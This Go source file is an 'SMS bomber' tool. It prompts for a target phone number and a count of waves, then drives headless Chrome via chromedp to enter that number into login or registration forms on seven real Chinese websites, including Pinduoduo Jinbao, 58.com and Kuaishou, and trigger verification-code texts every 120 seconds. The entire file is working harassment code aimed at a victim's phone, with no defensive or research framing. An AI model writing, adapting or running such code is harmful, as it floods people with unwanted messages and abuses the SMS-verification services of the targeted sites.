package main

import (
	"context"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

var (
	// 轰炸手机号
	phoneNum string

	// 轰炸总次数
	totalTimes int

	// 是否开始
	isStart int

	// 等待组
	waitGroup sync.WaitGroup

	// 浏览器标识
	userAgent = `Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36`

	// 是否加载页面图片
	isLoadImg = false

	// 是否为无头浏览器
	isHeadless = true
)

func main() {
	fmt.Println("请输入要轰炸的手机号及波次（以空格分隔）")
	fmt.Scanf("%s %d", &phoneNum, &totalTimes)
	fmt.Println("您要轰炸的手机号为[", phoneNum, "]，轰炸波次为[", totalTimes, "]次，是否开始？ 0-放弃，1-开始")
	fmt.Scan(&isStart)

	if isStart == 0 {
		fmt.Println("您已放弃，轰炸未执行")
		return
	}

	// 执行
	for i := 0; i < totalTimes; i++ {
		if i != 0 {
			// 每波间隔120秒
			time.Sleep(120 * time.Second)
		}

		fmt.Println("轰炸任务开始执行，当前波次[", i+1, "]")

		// 添加任务
		waitGroup.Add(7)
		go ddjbSendCode() // 多多进宝
		go jlmfSenCode()  // 居里买房
		go wbtcSendCode() // 58同城
		go ltdSendCode()  // LTD营销云
		go dhlSendCode()  // 订花乐
		go xrsSendCode()  // 学而思
		go ksSendCode()   // 快手
	}

	waitGroup.Wait()
	fmt.Println("全部任务执行结束")
}

// 当前时间
func currentTime() string {
	return "[" + time.Now().Format("2006-01-02 15:04:05") + "] "
}

// 多多进宝
func ddjbSendCode() {
	var (
		// 登录首页
		loginUrl = `https://jinbao.pinduoduo.com/`

		// 登录按钮
		loginBtnPath = `#__next > div.jsx-3954532995.container > section > div > div.login-wrapper.right > div > span`

		// 手机号
		mobilePhonePath = `#mobile`

		// 发送验证码
		sendCodePath = `body > div.MDL_outerWrapper_14d8fyu.MDL_modal_14d8fyu.MDL_showCloseIcon_14d8fyu > div > div > div.MDL_body_14d8fyu > div > div.login-code-wrapper > div.code-line > button > span`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginUrl),
		chromedp.Click(loginBtnPath),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(3*time.Second),
		chromedp.Text(sendCodePath, &timepiece),
	)

	if err != nil {
		fmt.Println(currentTime()+"多多进宝验证码发送失败", timepiece, err.Error())
		return
	}

	// 失败时“获取验证码”提示
	if !strings.Contains(timepiece, "获取验证码") {
		fmt.Println(currentTime()+"多多进宝验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"多多进宝验证码发送失败", timepiece)
}

// 居里买房
func jlmfSenCode() {
	var (
		// 注册页面
		registerUrl = `https://hz.julive.com/site/register?reset=0`

		// 手机号
		mobilePhonePath = `#register-mobile`

		// 发送验证码
		sendCodePath = `#register-get-captcha-btn`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(registerUrl),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath, chromedp.ByID),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece, chromedp.ByID),
	)

	if err != nil {
		fmt.Println(currentTime()+"居里买房验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "秒后可重发验证码") {
		fmt.Println(currentTime()+"居里买房验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"居里买房验证码发送失败", timepiece)
}

// 58同城
func wbtcSendCode() {
	var (
		// 注册页面
		registerUrl = `https://passport.58.com/reg?path=http%3A%2F%2Fmy.58.com%2F%3Fpts%3D1620884209448&isredirect=false&source=58-default-pc`

		// 手机号
		mobilePhonePath = `#mask_body_item_phonenum`

		// 发送验证码
		sendCodePath = `#mask_body_item_getcode`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(registerUrl),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath, chromedp.ByID),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece, chromedp.ByID),
	)

	if err != nil {
		fmt.Println(currentTime()+"58同城验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "后重新获取") {
		fmt.Println(currentTime()+"58同城验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"58同城验证码发送失败", timepiece)
}

// LTD营销云
func ltdSendCode() {
	var (
		// 登录页面
		loginUrl = `https://wei.ltd.com/user/#/auth/login?redirect=%2Fhome`

		// 手机号
		mobilePhonePath = `#pane-first > div > div:nth-child(2) > div > div > input`

		// 发送验证码
		sendCodePath = `#pane-first > div > div:nth-child(3) > div > div > div > button`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginUrl),
		chromedp.WaitVisible(mobilePhonePath),
		chromedp.SendKeys(mobilePhonePath, phoneNum),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece, chromedp.ByID),
	)

	if err != nil {
		fmt.Println(currentTime()+"LTD营销云验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "已发送") {
		fmt.Println(currentTime()+"LTD营销云验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"LTD营销云验证码发送失败", timepiece)
}

// 订花乐
func dhlSendCode() {
	var (
		// 首页地址
		homeUrl = `https://www.dinghuale.com`

		// 注册按钮
		registerPath = `#miao > div > div.header-top > div.container.clearfix > div.con-right.fr > a.fl.text-color-logo.align-center`

		// 手机号输入
		mobilePhonePath = `#regisMobile`

		// 发送验证码
		sendCodePath = `#shoujizhucepage > div.registration-formcont > div:nth-child(2) > div`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(homeUrl),
		chromedp.WaitVisible(registerPath),
		chromedp.Click(registerPath),
		chromedp.WaitVisible(mobilePhonePath, chromedp.ByID),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece),
	)

	if err != nil {
		fmt.Println(currentTime()+"订花乐验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "秒后重新发送") {
		fmt.Println(currentTime()+"订花乐验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"订花乐验证码发送失败", timepiece)
}

// 学而思
func xrsSendCode() {
	var (
		// 首页
		homeUrl = `https://hz.jiajiaoban.cn/pc/zz/index.html?utm_source=bd&utm_campaign=0571&bd_vid=8699081827648847238`

		// 手机号输入
		mobilePhonePath = `#izk-sign-content-tel`

		// 发送验证码
		sendCodePath = `#izk-part-signup > form > div > div:nth-child(2) > div.izk-sign-content-row-input-container.icon-name.smscode-select-wrap > div`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(homeUrl),
		chromedp.WaitVisible(mobilePhonePath, chromedp.ByID),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(3*time.Second),
		chromedp.Text(sendCodePath, &timepiece),
	)

	if err != nil {
		fmt.Println(currentTime()+"学而思验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "s") {
		fmt.Println(currentTime()+"学而思验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"学而思验证码发送失败", timepiece)
}

// 快手
func ksSendCode() {
	var (
		// 首页
		homeUrl = `https://video.kuaishou.com/?utm_source=aa&utm_medium=05&utm_campaign=aa_05_ppfhx_yr&plan_id=138090084&unit_id=5205658030&creative_id=43661481714&keyword_id=202928521171&keyword=202928521171&bd_vid=12360404916185877643`

		// 登录
		loginPath = `#app > div:nth-child(1) > section > div > div > header > div > div:nth-child(3) > ul > li.toolbar-item.user-info-item > div > div`

		// 手机号输入
		mobilePhonePath = `#app > div:nth-child(2) > div > div > div > div > div > div:nth-child(2) > div:nth-child(1) > div > div > div > div:nth-child(1) > div > input`

		// 发送验证码
		sendCodePath = `#app > div:nth-child(2) > div > div > div > div > div > div:nth-child(2) > div:nth-child(1) > div > div > div > div.verify-login-input.verification-input.pl-input-container > div > div > span`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(homeUrl),
		chromedp.WaitVisible(loginPath),
		chromedp.Click(loginPath),
		chromedp.WaitVisible(mobilePhonePath),
		chromedp.SendKeys(mobilePhonePath, phoneNum),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece),
	)

	if err != nil {
		fmt.Println(currentTime()+"快手验证码发送失败", timepiece, err.Error())
		return
	}

	if strings.Contains(timepiece, "s") {
		fmt.Println(currentTime()+"快手验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"快手验证码发送失败", timepiece)
}
